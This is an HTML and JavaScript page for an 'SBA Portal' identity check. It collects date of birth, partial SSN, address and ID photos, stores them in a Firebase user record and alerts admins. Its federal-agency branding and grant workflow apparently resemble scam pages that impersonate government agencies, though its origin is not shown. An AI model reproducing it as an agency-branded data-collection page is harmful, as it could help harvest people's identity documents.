<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Identity KYC | SBA Portal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="global.css">
    <style>
        #kycFormBox, #kycStatusBox { display: none; }
    </style>
</head>
<body>
<div id="pageLoader" class="page-loader active"><div class="spinner"></div></div>
<div class="app-layout">
    <aside class="app-sidebar" id="appSidebar"></aside>
    <main class="app-main">
        <div id="pageHeader"></div>
        <div class="app-main__content" style="max-width: 800px;">
            
            <div id="kycStatusBox" class="status-screen fade-in">
                <div id="st-icon" class="status-screen__icon"></div>
                <h1 id="st-title" class="status-screen__title"></h1>
                <p id="st-msg" class="status-screen__message"></p>
                <div id="st-actions"></div>
            </div>

            <div id="kycFormBox" class="fade-in">
                <div class="card mb-8">
                    <h3 class="mb-4" style="font-weight:900;">Identity Verification (KYC)</h3>
                    <p class="text-muted mb-8" style="font-size:0.9rem; line-height:1.6;">Federal law requires all grant recipients to verify their identity. Please provide clear photos of a government-issued ID.</p>
                    
                    <form id="kycForm">
                        <div class="form-row">
                            <div class="form-group"><label class="form-label form-label--required">Legal Name</label><input type="text" id="k-name" class="form-input" readonly></div>
                            <div class="form-group"><label class="form-label form-label--required">Date of Birth</label><input type="date" id="k-dob" class="form-input" required></div>
                        </div>
                        <div class="form-row">
                            <div class="form-group"><label class="form-label form-label--required">SSN (Last 4)</label><input type="password" id="k-ssn" class="form-input" maxlength="4" placeholder="XXXX" required></div>
                            <div class="form-group"><label class="form-label form-label--required">Phone Number</label><input type="tel" id="k-phone" class="form-input" required></div>
                        </div>
                        <div class="form-group"><label class="form-label form-label--required">Home Address</label><input type="text" id="k-addr" class="form-input" required></div>
                        <div class="form-row mb-6">
                            <div class="form-group">
                                <label class="form-label form-label--required">ID Type</label>
                                <select id="k-type" class="form-select" required>
                                    <option value="Driver License">Driver's License</option><option value="Passport">Passport</option><option value="State ID">State ID Card</option>
                                </select>
                            </div>
                            <div class="form-group"><label class="form-label form-label--required">Gender</label><select id="k-gen" class="form-select" required><option value="Male">Male</option><option value="Female">Female</option><option value="Other">Other / Prefer not to say</option></select></div>
                        </div>

                        <div class="form-row">
                            <div class="form-group">
                                <label class="form-label form-label--required">ID Front Image</label>
                                <div class="upload-area" id="up-f">
                                    <i class="fa-solid fa-id-card upload-area__icon"></i>
                                    <p class="upload-area__label">Upload Front</p>
                                    <img id="pre-f" class="upload-area__preview">
                                    <input type="file" id="in-f" hidden accept="image/*">
                                </div>
                            </div>
                            <div class="form-group" id="backContainer">
                                <label class="form-label">ID Back Image</label>
                                <div class="upload-area" id="up-b">
                                    <i class="fa-solid fa-id-card upload-area__icon"></i>
                                    <p class="upload-area__label">Upload Back</p>
                                    <img id="pre-b" class="upload-area__preview">
                                    <input type="file" id="in-b" hidden accept="image/*">
                                </div>
                            </div>
                        </div>

                        <label class="flex gap-3 mb-8" style="cursor:pointer; margin-top:20px;"><input type="checkbox" required> <span style="font-size:0.85rem;">I certify these documents are genuine and belong to me.</span></label>
                        <button type="submit" class="btn btn--primary btn--full btn--lg" id="btnKyc">Submit for Federal Verification</button>
                    </form>
                </div>
            </div>
        </div>
    </main>
</div>

<script type="module">
    import { updateUserData, serverTimestamp, compressToBase64, notifyAdmins, addLedgerEntry } from './firebase-config.js';
    import { requireAuth, buildSidebar, buildDock, buildPageHeader, initNotificationBadge, showToast, setButtonLoading } from './app.js';

    requireAuth((user, userData) => {
        buildSidebar({ activeId: 'kyc', userData });
        buildDock({ activeId: 'home' });
        buildPageHeader({ title: 'Identity Verification', subtitle: 'Federal Anti-Fraud Compliance', backUrl: 'dashboard.html' });
        initNotificationBadge(user.uid);

        const statusBox = document.getElementById('kycStatusBox');
        const formBox = document.getElementById('kycFormBox');

        if(userData.kycStatus === 'IDLE') {
            formBox.style.display = 'block';
            document.getElementById('k-name').value = userData.fullName;
        } else {
            statusBox.style.display = 'block';
            const icon = document.getElementById('st-icon');
            if(userData.kycStatus === 'UNDER_REVIEW') {
                icon.className = 'status-screen__icon status-screen__icon--info';
                icon.innerHTML = '<i class="fa-solid fa-magnifying-glass fa-bounce"></i>';
                document.getElementById('st-title').textContent = 'Audit in Progress';
                document.getElementById('st-msg').textContent = 'Our compliance team is manually reviewing your documents. Please wait 24-48 hours.';
            } else if(userData.kycStatus === 'APPROVED') {
                icon.className = 'status-screen__icon status-screen__icon--success';
                icon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
                document.getElementById('st-title').textContent = 'Identity Verified';
                document.getElementById('st-msg').textContent = 'Verification successful. Your account is now clear to submit grant applications.';
                document.getElementById('st-actions').innerHTML = '<a href="apply.html" class="btn btn--primary">Proceed to Application</a>';
            } else if(userData.kycStatus === 'REJECTED') {
                icon.className = 'status-screen__icon status-screen__icon--error';
                icon.innerHTML = '<i class="fa-solid fa-circle-xmark"></i>';
                document.getElementById('st-title').textContent = 'Verification Failed';
                document.getElementById('st-msg').textContent = userData.kyc?.reviewNote || 'The provided images were too blurry or didn\'t match profile data.';
                document.getElementById('st-actions').innerHTML = '<button class="btn btn--outline" id="btnRetry">Resubmit Documents</button>';
                document.getElementById('btnRetry').onclick = () => updateUserData(user.uid, { kycStatus: 'IDLE' }).then(()=>location.reload());
            }
        }

        // Upload Logic
        let f64 = '', b64 = '';
        const bindUp = (upId, inId, preId, type) => {
            const up = document.getElementById(upId);
            const input = document.getElementById(inId);
            const pre = document.getElementById(preId);
            up.onclick = () => input.click();
            input.onchange = async () => {
                if(!input.files[0]) return;
                const res = await compressToBase64(input.files[0]);
                if(type === 'f') f64 = res; else b64 = res;
                pre.src = res; pre.style.display = 'block'; up.classList.add('has-file');
            };
        };
        bindUp('up-f', 'in-f', 'pre-f', 'f');
        bindUp('up-b', 'in-b', 'pre-b', 'b');

        document.getElementById('k-type').onchange = (e) => {
            document.getElementById('backContainer').style.opacity = e.target.value === 'Passport' ? '0.3' : '1';
            document.getElementById('backContainer').style.pointerEvents = e.target.value === 'Passport' ? 'none' : 'auto';
        };

        document.getElementById('kycForm').onsubmit = async (e) => {
            e.preventDefault();
            if(!f64) return showToast('Front of ID is required', 'error');
            const btn = document.getElementById('btnKyc');
            setButtonLoading(btn, true, 'Processing Images...');

            const payload = {
                fullName: userData.fullName, dob: document.getElementById('k-dob').value, ssn: document.getElementById('k-ssn').value,
                phone: document.getElementById('k-phone').value, address: document.getElementById('k-addr').value,
                idType: document.getElementById('k-type').value, gender: document.getElementById('k-gen').value,
                idFrontBase64: f64, idBackBase64: b64, submittedAt: serverTimestamp()
            };

            try {
                await updateUserData(user.uid, { kyc: payload, kycStatus: 'UNDER_REVIEW' });
                await addLedgerEntry(user.uid, { type:'kyc', amount:0, description:'Identity Documentation Submitted', status:'PENDING' });
                await notifyAdmins({ title: 'New KYC Submittal', message: `${userData.fullName} sent identity docs.`, type:'action' });
                location.reload();
            } catch(err) {
                showToast(err.message, 'error');
                setButtonLoading(btn, false);
            }
        };
    });
</script>
</body>
</html>
